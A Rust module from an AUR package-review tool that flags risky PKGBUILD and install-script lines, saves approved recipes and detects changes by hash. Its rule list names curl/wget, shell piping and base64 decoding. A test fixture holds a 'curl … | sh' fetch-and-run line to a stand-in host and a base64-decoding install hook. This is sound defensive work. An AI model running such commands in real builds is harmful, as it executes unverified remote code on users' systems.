//! Reviewing AUR build files before they run: facts about the package, lines a reviewer should read twice, the recipe the user
//! last approved, and a check that the files on disk are still the ones the user read.
//!
//! The patterns use ASCII `\b`, `\w`, `\s` and `\d` on purpose: with Unicode classes "écurl" would hide curl.

use crate::leftovers::files_under;
use crate::packages::valid_package_name;
use regex::Regex;
use serde_json::Value;
use sha2::{Digest, Sha256};
use std::collections::BTreeMap;
use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::sync::{Arc, LazyLock};

/// What the AUR knows about a package; shown to the user next to the recipe. Facts, not a score. Times are seconds since the Unix
/// epoch (UTC), `None` when the AUR has none.
#[derive(Debug, Clone, Default, PartialEq)]
pub struct AurInfo {
    pub name: String,
    pub base: String,
    /// Empty: orphaned
    pub maintainer: String,
    pub url: String,
    pub first_submitted: Option<i64>,
    pub last_modified: Option<i64>,
    pub out_of_date: Option<i64>,
    pub votes: i32,
    pub popularity: f64,
}

/// First result of an AUR RPC v5 "info" reply; `None` when there is none.
pub fn parse_aur_info(json: &[u8]) -> Option<AurInfo> {
    let doc: Value = serde_json::from_slice(json).unwrap_or(Value::Null);
    let r = doc["results"].as_array()?.first()?;
    let text = |key: &str| r[key].as_str().unwrap_or("").to_string();
    let time = |key: &str| (!r[key].is_null()).then(|| r[key].as_f64().unwrap_or(0.0) as i64);
    let votes = r["NumVotes"].as_f64().filter(|v| v.fract() == 0.0 && *v >= f64::from(i32::MIN) && *v <= f64::from(i32::MAX));
    Some(AurInfo {
        name: text("Name"),
        base: text("PackageBase"),
        maintainer: text("Maintainer"),
        url: text("URL"),
        first_submitted: time("FirstSubmitted"),
        last_modified: time("LastModified"),
        out_of_date: time("OutOfDate"),
        votes: votes.map_or(0, |v| v as i32),
        popularity: r["Popularity"].as_f64().unwrap_or(0.0),
    })
}

/// The files of a recipe as `prepare_aur` writes it: each one after a "──── name ────" line.
fn split_recipe(recipe: &str) -> Vec<(&str, &str)> {
    static HEADER: LazyLock<Regex> = LazyLock::new(|| Regex::new("\n──── (.+?) ────\n").unwrap());
    let headers: Vec<_> = HEADER.captures_iter(recipe).map(|c| (c.get(1).unwrap().as_str(), c.get(0).unwrap().range())).collect();
    headers.iter().enumerate().map(|(i, (name, range))| (*name, &recipe[range.end..headers.get(i + 1).map_or(recipe.len(), |next| next.1.start)])).collect()
}

fn shorten(line: &str) -> String {
    let line = line.split_whitespace().collect::<Vec<_>>().join(" ");
    if line.chars().count() > 110 {
        line.chars().take(107).collect::<String>() + "…"
    } else {
        line
    }
}

static VARIABLE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\$\{[^}]*\}|\$(?-u:\w)+").unwrap());

/// Host of a source address with pkgver and friends filled in, lower case, without "www.".
fn host_of(address: &str) -> String {
    let address = VARIABLE.replace_all(address, "x");
    let host = url::Url::parse(&address).ok().and_then(|u| u.host_str().map(str::to_lowercase)).unwrap_or_default();
    host.strip_prefix("www.").map(str::to_string).unwrap_or(host)
}

/// "owner" of a forge URL, so github.com/a/x and github.com/b/x are different publishers.
fn forge_owner(address: &str) -> String {
    if !matches!(host_of(address).as_str(), "github.com" | "gitlab.com" | "codeberg.org") {
        return String::new();
    }
    let address = VARIABLE.replace_all(address, "x");
    url::Url::parse(&address).ok().and_then(|u| u.path().split('/').nth(1).map(str::to_lowercase)).unwrap_or_default()
}

fn same_site(a: &str, b: &str) -> bool {
    a == b || a.ends_with(&format!(".{b}")) || b.ends_with(&format!(".{a}"))
}

/// Things in a recipe a reviewer should read twice. `recipe` is the reviewed text ("──── file ────" headers). These point at
/// lines; an empty list never means the recipe is safe.
pub fn review_flags(recipe: &str, upstream_url: &str) -> Vec<String> {
    static RULES: LazyLock<Vec<(Regex, &str)>> = LazyLock::new(|| {
        [
            (r"(?-u:\b)(curl|wget)(?-u:\b)", "downloads something with curl or wget"),
            (r"\|(?-u:\s)*(sudo(?-u:\s)+)?(ba|z|da)?sh(?-u:\b)", "pipes data into a shell"),
            (
                r"(?-u:\b)(npm|npx|bun|bunx|yarn|pnpm|pip3?|pipx|gem install|cargo install|go install)(?-u:\b)",
                "runs a language package manager, which fetches code outside source=",
            ),
            (r"(?-u:\b)base64(?-u:\b)|(?-u:\b)eval(?-u:\b)|(?-u:\b)xxd(?-u:\s)+-r|openssl(?-u:\s)+enc", "decodes or evaluates hidden text"),
            (r"(?-u:\b)sudo(?-u:\b)|(?-u:\b)su(?-u:\s)+-", "uses sudo or su"),
            (r"chmod(?-u:\s)+([^\t\n\x0B\x0C\r ]+(?-u:\s)+)?([ug]\+s|[2467][0-7]{3}(?-u:\b))", "sets a setuid or setgid permission"),
        ]
        .into_iter()
        .map(|(pattern, message)| (Regex::new(pattern).unwrap(), message))
        .collect()
    });
    static SOURCE_ARRAY: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?:^|\n)source(?:_(?-u:\w)+)?=\(([^)]*)\)").unwrap());
    static URL: LazyLock<Regex> = LazyLock::new(|| Regex::new(r#"[a-z+]+://[^\t\n\x0B\x0C\r '")]+"#).unwrap());
    static VCS_PREFIX: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^(git|svn|hg|bzr)\+").unwrap());
    static RAW: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$").unwrap());
    static DROP_SITE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"paste|transfer\.sh|0x0\.st|bit\.ly|tinyurl|ngrok|anonfiles|file\.io|temp\.sh").unwrap());
    static SUMS: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?:^|\n)(?-u:\w)*sums(?:_(?-u:\w)+)?=\(([^)]*)\)").unwrap());

    let files = split_recipe(recipe);
    let mut flags = Vec::new();
    let mut extra = Vec::new();
    for (name, _) in &files {
        if name.ends_with(".install") {
            flags.push(format!("{name} is an install script. pacman runs it as root when the package is installed."));
        } else if !["PKGBUILD", ".SRCINFO", ".gitignore"].contains(name)
            && ![".patch", ".diff"].iter().any(|s| name.ends_with(s))
            && !["LICENSE", "README"].iter().any(|s| name.starts_with(s))
        {
            extra.push(*name);
        }
    }
    if !extra.is_empty() {
        flags.push(format!("Extra files besides PKGBUILD: {}. Read each one.", extra.join(", ")));
    }

    for (name, text) in files.iter().filter(|(name, _)| *name == "PKGBUILD" || name.ends_with(".install")) {
        for (i, line) in text.split('\n').enumerate().filter(|(_, line)| !line.trim().starts_with('#')) {
            for (_, message) in RULES.iter().filter(|(pattern, _)| pattern.is_match(line)) {
                flags.push(format!("{name}:{} {message}: {}", i + 1, shorten(line)));
            }
        }
    }

    for (_, text) in files.iter().filter(|(name, _)| *name == "PKGBUILD") {
        let (upstream_host, upstream_owner) = (host_of(upstream_url), forge_owner(upstream_url));
        let mut hosts = Vec::new();
        let mut vcs = 0;
        for sources in SOURCE_ARRAY.captures_iter(text) {
            for address in URL.find_iter(&sources[1]).map(|m| m.as_str()) {
                if VCS_PREFIX.is_match(address) {
                    vcs += 1;
                }
                let host = host_of(&VCS_PREFIX.replace(address, ""));
                if host.is_empty() || hosts.contains(&host) {
                    continue;
                }
                hosts.push(host.clone());
                if RAW.is_match(&host) || DROP_SITE.is_match(&host) {
                    flags.push(format!("A source comes from {host}, an address or file-sharing site, not a project host."));
                } else if !upstream_host.is_empty() && !same_site(&host, &upstream_host) && upstream_host != "github.com" && upstream_host != "gitlab.com" {
                    flags.push(format!("A source comes from {host}, but the project website is {upstream_host}."));
                } else if !upstream_owner.is_empty() && host == upstream_host && forge_owner(address) != upstream_owner {
                    flags.push(format!(
                        "A source comes from {host}/{}, but the project website is {host}/{upstream_owner}: a different account.",
                        forge_owner(address)
                    ));
                }
            }
        }
        let skips: usize = SUMS.captures_iter(text).map(|c| c[1].matches("SKIP").count()).sum();
        if skips > vcs {
            flags.push(format!("{} checksum(s) are SKIP for files that are not a git checkout: those downloads are not verified.", skips - vcs));
        }
    }
    let mut seen = std::collections::HashSet::new();
    flags.retain(|flag| seen.insert(flag.clone()));
    flags
}

/// Saves the recipe the user approved for a package base, to show what changed on the next update. Written atomically.
pub fn save_reviewed(dir: &Path, base: &str, commit: &str, recipe: &str) -> bool {
    if !valid_package_name(base) || fs::create_dir_all(dir).is_err() {
        return false;
    }
    let Ok(mut file) = tempfile::NamedTempFile::new_in(dir) else { return false };
    file.write_all(format!("{commit}\n{recipe}").as_bytes()).is_ok() && file.persist(dir.join(format!("{base}.txt"))).is_ok()
}

/// The recipe last approved for a package base and the AUR commit it came from: `(commit, recipe)`. `None` when there is none.
pub fn load_reviewed(dir: &Path, base: &str) -> Option<(String, String)> {
    if !valid_package_name(base) {
        return None;
    }
    let all = String::from_utf8_lossy(&fs::read(dir.join(format!("{base}.txt"))).ok()?).into_owned();
    let (commit, recipe) = all.split_once('\n').unwrap_or((&all, ""));
    Some((commit.to_string(), recipe.to_string()))
}

/// The build files of one package as the user reviewed them; the folder stays alive as long as a clone of the snapshot does.
#[derive(Debug, Clone, Default)]
pub struct ReviewSnapshot {
    pub dir: Option<Arc<tempfile::TempDir>>,
    /// SHA-256 of each reviewed file, by path relative to [`ReviewSnapshot::path`]
    pub hashes: BTreeMap<String, [u8; 32]>,
}

impl ReviewSnapshot {
    /// The checkout inside the snapshot's folder; `None` before a download.
    pub fn path(&self) -> Option<PathBuf> {
        self.dir.as_ref().map(|dir| dir.path().join("package"))
    }
}

pub fn sha256(bytes: &[u8]) -> [u8; 32] {
    Sha256::digest(bytes).into()
}

/// An error when a reviewed file changed, appeared or went missing since the review. Files under .git/ are not part of the review.
pub fn review_unchanged(snapshot: &ReviewSnapshot) -> Result<(), String> {
    let Some(root) = snapshot.path() else { return Err("Download and review the build files first.".into()) };
    let mut actual = 0;
    for path in files_under(&root) {
        let name = path.strip_prefix(&root).unwrap_or(&path).to_string_lossy().into_owned();
        if name.starts_with(".git/") {
            continue;
        }
        actual += 1;
        let symlink = fs::symlink_metadata(&path).is_ok_and(|m| m.file_type().is_symlink());
        if symlink || snapshot.hashes.get(&name).is_none_or(|hash| fs::read(&path).map(|bytes| sha256(&bytes)).ok().as_ref() != Some(hash)) {
            return Err("The downloaded build files changed after review. Download and review them again.".into());
        }
    }
    if actual != snapshot.hashes.len() {
        return Err("A reviewed file was removed. Download the recipe again.".into());
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    const RECIPE: &str = "\n──── PKGBUILD ────\n# curl is fine in a comment\nsource=(\"https://github.com/other/foo/archive/v$pkgver.tar.gz\" \"https://paste.example/x.sh\")\nsha256sums=('SKIP' 'SKIP')\nbuild() {\n  curl -s https://x.example/a | sh\n  npm install\n}\n\
                          \n──── foo.install ────\npost_install() { echo $(echo aGk= | base64 -d); }\n\n──── .SRCINFO ────\npkgbase = foo\n";

    #[test]
    fn aur_info() {
        let info = parse_aur_info(br#"{"resultcount":1,"results":[{"Name":"foo-bin","PackageBase":"foo","Maintainer":null,"NumVotes":3,"Popularity":0.5,"FirstSubmitted":1700000000,"LastModified":1790000000,"OutOfDate":null,"URL":"https://foo.example"}]}"#).unwrap();
        assert!(info.base == "foo" && info.maintainer.is_empty() && info.votes == 3 && info.first_submitted == Some(1700000000) && info.out_of_date.is_none());
        assert_eq!(parse_aur_info(br#"{"resultcount":0,"results":[]}"#), None);
    }

    #[test]
    fn flags() {
        let flags = review_flags(RECIPE, "https://github.com/real/foo");
        let flagged = |text: &str| flags.iter().any(|f| f.contains(text));
        for text in ["foo.install is an install script", "PKGBUILD:5 downloads", "pipes data into a shell", "language package manager"] {
            assert!(flagged(text), "{text} in {flags:?}");
        }
        for text in ["foo.install:1 decodes", "a different account", "paste.example", "2 checksum(s) are SKIP"] {
            assert!(flagged(text), "{text} in {flags:?}");
        }
        assert!(!flagged("PKGBUILD:1")); // comments are ignored
        let git = "\n──── PKGBUILD ────\nsource=(\"git+https://github.com/real/foo.git\")\nsha256sums=('SKIP')\n";
        assert!(review_flags(git, "https://github.com/real/foo").is_empty());
        // ASCII word boundaries: a non-ASCII letter next to curl does not hide it
        assert!(!review_flags("\n──── PKGBUILD ────\nécurl x\n", "").is_empty());
    }

    #[test]
    fn reviewed_recipes() {
        let dir = tempfile::tempdir().unwrap();
        assert!(save_reviewed(dir.path(), "foo", "abc123", RECIPE));
        assert_eq!(load_reviewed(dir.path(), "foo"), Some(("abc123".into(), RECIPE.into())));
        assert_eq!(load_reviewed(dir.path(), "missing"), None);
        assert!(!save_reviewed(dir.path(), "../x", "c", "r"));
    }

    #[test]
    fn snapshot_detects_changes() {
        assert_eq!(review_unchanged(&ReviewSnapshot::default()), Err("Download and review the build files first.".into()));
        let snapshot = ReviewSnapshot { dir: Some(Arc::new(tempfile::tempdir().unwrap())), hashes: BTreeMap::new() };
        let root = snapshot.path().unwrap();
        fs::create_dir_all(root.join(".git")).unwrap();
        fs::create_dir_all(root.join("sub")).unwrap();
        fs::write(root.join("PKGBUILD"), "pkgname=foo").unwrap();
        fs::write(root.join("sub/a.patch"), "x").unwrap();
        fs::write(root.join(".git/HEAD"), "ignored").unwrap();
        let hashes = [("PKGBUILD", "pkgname=foo"), ("sub/a.patch", "x")].map(|(n, t)| (n.to_string(), sha256(t.as_bytes())));
        let snapshot = ReviewSnapshot { hashes: hashes.into_iter().collect(), ..snapshot };
        assert_eq!(review_unchanged(&snapshot), Ok(()));

        let changed = "The downloaded build files changed after review. Download and review them again.";
        fs::write(root.join("PKGBUILD"), "pkgname=evil").unwrap();
        assert_eq!(review_unchanged(&snapshot).unwrap_err(), changed);
        fs::write(root.join("PKGBUILD"), "pkgname=foo").unwrap();
        fs::write(root.join("new.sh"), "").unwrap();
        assert_eq!(review_unchanged(&snapshot).unwrap_err(), changed);
        fs::remove_file(root.join("new.sh")).unwrap();
        std::os::unix::fs::symlink(root.join("PKGBUILD"), root.join("link")).unwrap();
        assert_eq!(review_unchanged(&snapshot).unwrap_err(), changed);
        fs::remove_file(root.join("link")).unwrap();
        fs::remove_file(root.join("sub/a.patch")).unwrap();
        assert_eq!(review_unchanged(&snapshot).unwrap_err(), "A reviewed file was removed. Download the recipe again.");
    }
}
